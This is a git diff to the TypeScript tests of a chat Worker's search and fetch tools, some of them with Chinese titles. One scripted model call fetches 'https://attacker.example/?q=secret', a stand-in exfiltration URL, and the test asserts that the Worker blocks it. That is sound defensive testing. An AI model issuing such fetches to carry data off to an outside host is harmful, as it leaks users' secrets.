@@ -72,6 +72,7 @@ test("三个模型的 SDK 请求都启用消息级 effort，工具续跑继承�
         AI_DEV: "true",
         CHAT_FORCE_TIER: tier === "haiku" ? "haiku-medium" : tier,
         ANTHROPIC_API_KEY: "test-key",
+        EXA_API_KEY: "test-exa",
         TURNSTILE_SECRET_KEY: "test-key",
         CHAT_HISTORY_SECRET: "test-seal",
         ALLOWED_ORIGINS: "https://lyjw.me",
@@ -103,10 +104,10 @@ test("三个模型的 SDK 请求都启用消息级 effort，工具续跑继承�
         assert.equal(body.model, GOD_CHAT_TIER_INFO[tier].model);
         assert.ok(body.tools?.every((tool) => !("name" in tool) || !["draft_github_issue", "start_design", "propose_build"].includes(tool.name)));
         assert.equal(body.output_config, undefined);
-        assert.equal(body.mcp_servers, undefined);
-        assert.ok(body.tools?.some((tool) => "name" in tool && tool.name === "web_search"));
-        assert.ok(body.tools?.every((tool) => !("type" in tool) || tool.type !== "mcp_toolset"));
-        assert.equal(headers.get("anthropic-beta")?.includes("mcp-client-2025-11-20"), false);
+        assert.deepEqual(body.mcp_servers?.map((server) => server.name), ["context7", "cloudflare-docs"]);
+        assert.ok(body.tools?.some((tool) => "name" in tool && tool.name === "web_search" && !("type" in tool)));
+        assert.ok(body.tools?.some((tool) => "name" in tool && tool.name === "web_fetch"));
+        assert.ok(headers.get("anthropic-beta")?.includes("mcp-client-2025-11-20"));
         assert.deepEqual(body.thinking, { type: "adaptive", display: "summarized" });
         assert.ok(headers.get("anthropic-beta")?.includes("mid-conversation-output-config-2026-07-01"));
         assert.equal(headers.get("anthropic-beta")?.includes("server-side-fallback-2026-07-01"), tier !== "haiku");
@@ -575,58 +576,47 @@ test("服务端无视工具关闭继续返回调用也不能延长工具循环",
   assert.ok(events.some((event) => event.type === "text" && event.text.includes("ran out of steps")));
 });
 
-function pendingSearchStream(model: string, round: number, searches: number): Response {
-  const events = [
-    { type: "message_start", message: { id: "msg_test", type: "message", role: "assistant", model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 0 } } },
-    { type: "content_block_start", index: 0, content_block: { type: "tool_use", id: `tool_${round}`, name: "get_site_status", input: {} } },
-    { type: "content_block_delta", index: 0, delta: { type: "input_json_delta", partial_json: JSON.stringify({ views: ["timezone"] }) } },
-    { type: "content_block_stop", index: 0 },
-    { type: "content_block_start", index: 1, content_block: { type: "server_tool_use", id: `srvtoolu_${round}`, name: "code_execution", input: {} } },
-    { type: "content_block_delta", index: 1, delta: { type: "input_json_delta", partial_json: JSON.stringify({ code: "await web_search({ query: 'deepseek pricing' })" }) } },
-    { type: "content_block_stop", index: 1 },
-    { type: "message_delta", delta: { stop_reason: "tool_use", stop_sequence: null }, usage: { output_tokens: 10, server_tool_use: { web_search_requests: searches } } },
-    { type: "message_stop" },
-  ];
-  return new Response(events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join(""), {
-    headers: { "Content-Type": "text/event-stream" },
-  });
-}
-
-function rejectsUnresolvedServerTool(body: Anthropic.Beta.MessageCreateParamsStreaming): Response | undefined {
-  const open = new Set<string>();
-  for (const message of body.messages) {
-    if (message.role !== "assistant" || typeof message.content === "string") continue;
-    for (const block of message.content) {
-      if (block.type === "server_tool_use") open.add(block.id);
-      else if ("tool_use_id" in block) open.delete(block.tool_use_id);
-    }
-  }
-  if (!open.size || body.tools?.some((tool) => "name" in tool && tool.name === "web_search")) return undefined;
-  return Response.json({ type: "error", error: { type: "invalid_request_error", message: "`code_execution` tool use was found without a corresponding `code_execution_tool_result` block, but no `code_execution` tool was provided" } }, { status: 400 });
-}
-
-test("动态过滤搜索与客户端工具同轮时，下一轮（含收尾轮、搜索次数用完）仍带搜索工具接上，不断流", async (t) => {
+test("web_search 走 Worker 调搜索服务，结果回成 search_result，引用进来源；web_fetch 不读没出现过的 URL", async (t) => {
   const original = globalThis.fetch;
-  globalThis.fetch = async () => Response.json({ success: true, hostname: "lyjw.me", action: GOD_CHAT_TURNSTILE_ACTION });
+  const outbound: string[] = [];
+  globalThis.fetch = async (input) => {
+    const url = String(input);
+    if (url.includes("api.exa.ai")) {
+      outbound.push(url);
+      return Response.json({ results: [{ url: "https://e.dev/page", title: "E", highlights: ["fact"] }] });
+    }
+    return Response.json({ success: true, hostname: "lyjw.me", action: GOD_CHAT_TURNSTILE_ACTION });
+  };
   t.after(() => { globalThis.fetch = original; });
-  for (const searches of [0, GOD_CHAT_LIMITS.maxWebSearches]) {
-    await t.test(`每轮记 ${searches} 次搜索`, async () => {
-      let round = 0;
-      const { env, requests } = designEnv({
-        reply: (body) => rejectsUnresolvedServerTool(body)
-          ?? (body.tools?.length === 1 ? modelStream(body.model, false) : pendingSearchStream(body.model, round++, searches)),
-      });
-      const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
-      assert.ok(events.every((event) => event.type !== "text" || !event.text.includes("connection to the heavens was lost")));
-      assert.ok(events.some((event) => event.type === "text" && event.text === "Done."));
-      for (const request of requests.slice(1)) {
-        const search = request.tools?.find((tool) => "name" in tool && tool.name === "web_search");
-        assert.ok(search && "max_uses" in search && search.max_uses! >= 1);
-      }
-      assert.deepEqual(requests.at(-1)?.tools?.map((tool) => "name" in tool && tool.name), ["web_search"]);
-      assert.equal(requests.length, searches ? 2 : GOD_CHAT_LIMITS.maxToolRounds + 1);
-    });
-  }
+  const calls = [
+    { name: "web_search", input: { query: "deepseek pricing" } },
+    { name: "web_fetch", input: { url: "https://attacker.example/?q=secret" } },
+  ];
+  const { env, requests } = designEnv({
+    reply: (body) => {
+      const call = calls[requests.length - 1];
+      if (call) return modelStream(body.model, call);
+      const events = [
+        { type: "message_start", message: { id: "msg_test", type: "message", role: "assistant", model: body.model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 0 } } },
+        { type: "content_block_start", index: 0, content_block: { type: "text", text: "", citations: [] } },
+        { type: "content_block_delta", index: 0, delta: { type: "text_delta", text: "Cheap." } },
+        { type: "content_block_delta", index: 0, delta: { type: "citations_delta", citation: { type: "search_result_location", source: "https://e.dev/page", title: "E", cited_text: "fact", search_result_index: 0, start_block_index: 0, end_block_index: 1 } } },
+        { type: "content_block_stop", index: 0 },
+        { type: "message_delta", delta: { stop_reason: "end_turn", stop_sequence: null }, usage: { output_tokens: 10 } },
+        { type: "message_stop" },
+      ];
+      return new Response(events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join(""), { headers: { "Content-Type": "text/event-stream" } });
+    },
+  });
+  env.EXA_API_KEY = "test-exa";
+  const events = await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content: "How much is DeepSeek?" }]), env, toolIO));
+  assert.equal(outbound.length, 1);
+  const searchResult = requests[1].messages.at(-1)?.content;
+  assert.ok(Array.isArray(searchResult) && searchResult[0].type === "tool_result" && Array.isArray(searchResult[0].content) && searchResult[0].content[0].type === "search_result");
+  const fetchResult = requests[2].messages.at(-1)?.content;
+  assert.ok(Array.isArray(fetchResult) && fetchResult[0].type === "tool_result" && fetchResult[0].is_error === true);
+  assert.ok(events.some((event) => event.type === "search" && event.query === "deepseek pricing"));
+  assert.deepEqual(events.find((event) => event.type === "sources"), { type: "sources", sources: [{ url: "https://e.dev/page", title: "E" }] });
 });
 
 function scriptedStream(model: string, blocks: Record<string, unknown>[], stop: string): Response {
